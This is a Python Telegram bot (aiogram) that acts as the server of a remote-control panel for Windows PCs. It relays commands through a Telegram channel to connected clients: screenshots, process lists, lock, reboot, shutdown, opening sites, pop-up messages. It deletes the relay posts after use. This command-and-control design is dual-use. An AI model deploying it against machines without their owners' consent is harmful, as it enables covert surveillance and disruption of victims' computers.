import asyncio
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile
from dotenv import load_dotenv

load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")  # Токен БОТА №1 (Сервер)
ADMIN_ID = 5153650495  # Твой ID

# ЮЗЕРНЕЙМ ТВОЕГО КАНАЛА БЕЗ СИМВОЛА @
CHANNEL_USERNAME = "hurghgruuruhgrughuhgur47846776v7" 

bot = Bot(token=TOKEN)
dp = Dispatcher()

# В оперативной памяти храним подключенные ПК
connected_pcs = {}

def is_admin(user_id: int) -> bool:
    return user_id == ADMIN_ID

# Генератор главного меню
def get_main_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="💻 Показать список устройств", callback_data="back_to_list")]
    ])

# Генератор категорий под конкретный ПК
def get_device_menu(device_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Инфо и Мониторинг", callback_data=f"cat_mon_{device_id}")],
        [InlineKeyboardButton(text="⚙️ Системные действия", callback_data=f"cat_sys_{device_id}")],
        [InlineKeyboardButton(text="🌐 Открытие ресурсов", callback_data=f"cat_web_{device_id}")],
        [InlineKeyboardButton(text="🛠 Утилиты и Приложения", callback_data=f"cat_util_{device_id}")],
        [InlineKeyboardButton(text="⬅️ В главное меню", callback_data="go_to_main_start")]
    ])

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    if not is_admin(message.from_user.id): return
    await message.answer(
        "🤖 **Добро пожаловать в панель управления Windows!**\n\n"
        "Вся навигация полностью переведена на интерактивные кнопки под сообщениями.", 
        parse_mode="Markdown", 
        reply_markup=get_main_menu()
    )

# Кнопка возврата в самое начало
@dp.callback_query(F.data == "go_to_main_start")
async def go_to_main_start(callback: types.CallbackQuery):
    await callback.message.edit_text(
        "🤖 **Главное меню панели управления**", 
        parse_mode="Markdown", 
        reply_markup=get_main_menu()
    )

# Вывод списка устройств по кнопке
@dp.callback_query(F.data == "back_to_list")
async def show_devices_callback(callback: types.CallbackQuery):
    if not connected_pcs:
        await callback.message.edit_text(
            "❌ Список устройств пуст. Ожидайте автоматического подключения клиентов.",
            reply_markup=get_main_menu()
        )
        return
    
    keyboard = [[InlineKeyboardButton(text=f"💻 {info['name']}", callback_data=f"manage_{dev_id}")] for dev_id, info in connected_pcs.items()]
    await callback.message.edit_text("🎛 **Выберите активное устройство:**", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))

@dp.callback_query(F.data.startswith("manage_"))
async def manage_device(callback: types.CallbackQuery):
    device_id = callback.data.split("_")[1]
    device_info = connected_pcs.get(device_id)
    if not device_info:
        await callback.answer("❌ Устройство оффлайн.")
        return
    await callback.message.edit_text(
        text=f"💻 Управление ПК: *{device_info['name']}*\n🆔 ID: `{device_id}`", 
        parse_mode="Markdown", 
        reply_markup=get_device_menu(device_id)
    )

# --- Вложенные категории меню ---
@dp.callback_query(F.data.startswith("cat_mon_"))
async def cat_monitoring(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📸 Сделать скриншот", callback_data=f"cmd_screen_{dev_id}")],
        [InlineKeyboardButton(text="📋 Список процессов", callback_data=f"cmd_tasklist_{dev_id}")],
        [InlineKeyboardButton(text="🔊 Звук на максимум", callback_data=f"cmd_volmax_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="📊 **Инфо и Мониторинг**", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cat_sys_"))
async def cat_system(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔒 Заблокировать экран", callback_data=f"cmd_lock_{dev_id}")],
        [InlineKeyboardButton(text="🌙 В спящий режим", callback_data=f"cmd_sleep_{dev_id}")],
        [InlineKeyboardButton(text="🔄 Перезагрузить ПК", callback_data=f"cmd_reboot_{dev_id}")],
        [InlineKeyboardButton(text="🛑 Выключить ПК", callback_data=f"cmd_shutdown_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="⚙️ **Системные действия**", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cat_web_"))
async def cat_web(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🌐 Открыть YouTube", callback_data=f"cmd_yt_{dev_id}")],
        [InlineKeyboardButton(text="🔍 Открыть Google", callback_data=f"cmd_google_{dev_id}")],
        [InlineKeyboardButton(text="🗺 Открыть Карты", callback_data=f"cmd_maps_{dev_id}")],
        [InlineKeyboardButton(text="💬 Вывести Сообщение", callback_data=f"cmd_msg_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="🌐 **Открытие ресурсов и медиа**", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cat_util_"))
async def cat_utilities(callback: types.CallbackQuery):
    dev_id = callback.data.split("_")[2]
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🧮 Запустить Калькулятор", callback_data=f"cmd_calc_{dev_id}")],
        [InlineKeyboardButton(text="📝 Запустить Блокнот", callback_data=f"cmd_notepad_{dev_id}")],
        [InlineKeyboardButton(text="🎨 Запустить Paint", callback_data=f"cmd_paint_{dev_id}")],
        [InlineKeyboardButton(text="⏳ Запустить Хранитель экрана", callback_data=f"cmd_scr_{dev_id}")],
        [InlineKeyboardButton(text="⬅️ Назад", callback_data=f"manage_{dev_id}")]
    ])
    await callback.message.edit_text(text="🛠 **Запуск встроенных утилит**", reply_markup=keyboard)

@dp.callback_query(F.data.startswith("cmd_"))
async def send_command(callback: types.CallbackQuery):
    _, cmd_type, device_id = callback.data.split("_", 2)
    try:
        await bot.send_message(chat_id=f"@{CHANNEL_USERNAME}", text=f"CMD:{device_id}:{cmd_type}")
        await callback.answer("🚀 Команда отправлена!")
    except:
        await callback.answer("❌ Ошибка отправки в канал.")


# --- ОБРАБОТКА ПОСТОВ ОТ КЛИЕНТА (БОТА №2) ИЗ КАНАЛА ---

@dp.channel_post(F.text.startswith("PING:"))
async def handle_channel_ping(message: types.Message):
    try:
        _, device_id, pc_name = message.text.split(":")
        
        # Если устройства вообще не было в нашей сессии (первый запуск скрипта)
        if device_id not in connected_pcs:
            connected_pcs[device_id] = {"name": pc_name, "status": "online"}
            await bot.send_message(
                chat_id=ADMIN_ID, 
                text=f"🆕 **Зарегистрирован новый ПК в сети!**\n💻 Имя: `{pc_name}`\n🆔 ID: `{device_id}`", 
                parse_mode="Markdown",
                reply_markup=get_device_menu(device_id)
            )
        # Если статус устройства был изменен или оно переподключилось (просто включили ПК)
        elif connected_pcs[device_id].get("status") == "offline":
            connected_pcs[device_id]["status"] = "online"
            await bot.send_message(
                chat_id=ADMIN_ID, 
                text=f"🟢 **ПК снова в сети!**\n💻 Имя: `{pc_name}`", 
                parse_mode="Markdown",
                reply_markup=get_device_menu(device_id)
            )
        else:
            # Обычный фоновый пинг каждые 2 минуты — обновляем данные без спама сообщениями
            connected_pcs[device_id] = {"name": pc_name, "status": "online"}
            
        await message.delete()
    except: pass

@dp.channel_post(F.document & F.caption.startswith("SCREEN_REPLY:"))
async def receive_channel_screenshot(message: types.Message):
    try:
        device_id = message.caption.split(":")[1]
        pc_name = connected_pcs.get(device_id, {}).get("name", "Неизвестный ПК")
        file_buffer = await bot.download_file((await bot.get_file(message.document.file_id)).file_path)
        
        # Присылаем скриншот и СРАЗУ под ним крепим кнопки управления этим ПК
        await bot.send_photo(
            chat_id=ADMIN_ID, 
            photo=BufferedInputFile(file_buffer.read(), filename="screenshot.png"), 
            caption=f"📸 Скриншот с ПК: *{pc_name}*", 
            parse_mode="Markdown",
            reply_markup=get_device_menu(device_id)
        )
        await message.delete()
    except: pass

@dp.channel_post(F.text.startswith("LOG_REPLY:"))
async def receive_channel_log(message: types.Message):
    try:
        text_data = message.text.replace("LOG_REPLY:", "")
        # Ищем ID устройства в тексте лога для генерации меню кнопок
        device_id = None
        for dev_id, info in connected_pcs.items():
            if info["name"] in text_data:
                device_id = dev_id
                break
        
        # Присылаем лог процессов и сразу под ним кнопки управления этим ПК
        await bot.send_message(
            chat_id=ADMIN_ID, 
            text=text_data, 
            parse_mode="Markdown",
            reply_markup=get_device_menu(device_id) if device_id else None
        )
        await message.delete()
    except: pass

async def main():
    print("[СЕРВЕР] Полностью кнопочный интерфейс запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
